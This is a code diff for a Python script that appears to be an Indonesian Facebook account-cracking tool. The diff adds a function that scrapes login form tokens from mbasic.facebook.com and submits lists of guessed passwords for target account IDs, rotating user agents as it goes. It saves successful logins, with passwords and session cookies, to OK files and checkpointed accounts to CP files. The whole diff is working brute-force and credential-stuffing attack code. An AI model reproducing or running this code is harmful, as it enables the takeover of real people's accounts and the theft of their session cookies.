@@ -1146,7 +1146,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(reguler,idf,pwv)
+                pool.submit(crack3,idf,pwv)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1160,13 +1160,76 @@ def passwrd():
         time.sleep(1)
         exit()
 
+
+def crack3(idf,pwv):
+    global loop,ok,cp
+    bi = random.choice([u,k,kk,b,h,hh])
+    pers = loop*100/len(id2)
+    fff = '%'
+    print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+    ua = random.choice(free)
+    ua2 = random.choice(ugent)
+    ses = requests.Session()
+    for pw in pwv:
+        try:
+            tix = time.time()
+            ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
+            dataa ={
+'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+'email':idf,
+'pass':pw
+}
+            ses.headers.update({'Host': 'mbasic.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://mbasic.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': ua,
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-user': 'empty',
+'sec-fetch-dest': 'document',
+'referer': 'https://mbasic.facebook.com/login/?email='+idf,
+'accept-encoding':'gzip, deflate br',
+'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                print('\n')
+                statuscp = f'[•] ID : {idf} [•] PASSWORD : {pw}'
+                statuscp1 = nel(statuscp, style='red')
+                cetak(nel(statuscp1, title='SESI'))
+                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                akun.append(idf+'|'+pw)
+                cp+=1
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok+=1
+                coki=po.cookies.get_dict()
+                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                print('\n')
+                statusok = f'[OK]       : {idf}\n[OK] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'   
+                statusok1 = nel(statusok, style='green')
+                cetak(nel(statusok1, title='SESI'))
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop+=1
+
 def mbasic(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=open('bbnew.txt','r').read().splitlines()
+	ua=random.choice(free)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
